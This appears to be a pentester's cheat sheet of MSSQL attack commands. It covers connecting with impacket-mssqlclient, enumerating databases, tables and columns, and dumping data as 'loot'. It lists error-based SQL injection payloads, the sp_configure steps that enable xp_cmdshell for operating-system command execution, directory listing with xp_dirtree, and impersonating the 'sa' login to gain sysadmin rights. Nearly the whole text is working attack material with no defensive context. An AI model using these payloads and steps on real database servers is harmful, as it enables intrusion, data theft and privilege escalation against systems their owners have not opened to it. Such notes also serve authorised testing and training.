# MSSQL

### Connect
```
impacket-mssqlclient -p 1433 -windows-auth -dc-ip 10.10.10.10 domain.com/user@$IP
```
### Version
```
SELECT @@version
```
### Time Delay
```
WAITFOR DELAY '0:0:10'
``` 
### List Databases
```
SELECT name FROM master..sysdatabases;
``` 
### List Tables
```
SELECT name FROM InsertDatabaseHere..sysobjects WHERE xtype = 'U';
```
### List Columns
```
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'InsertTableHere');
```
### Get Loot
```
SELECT concat(InsertColumnHere,':',InsertColumnHere) FROM InsertTableHere;
```
### Error Based
###### Integer
```
convert(int,@@version)
cast((SELECT @@version) as int)
```
###### Strings
```
' + convert(int,@@version) + '
' + cast((SELECT @@version) as int) + '
```
### Commnad Execution
```
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXEC xp_cmdshell "whoami";
```
### System Traversal
```
xp_dirtree 'c:\inetpub\wwwroot',1,1;
```
### Impersonate
```
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
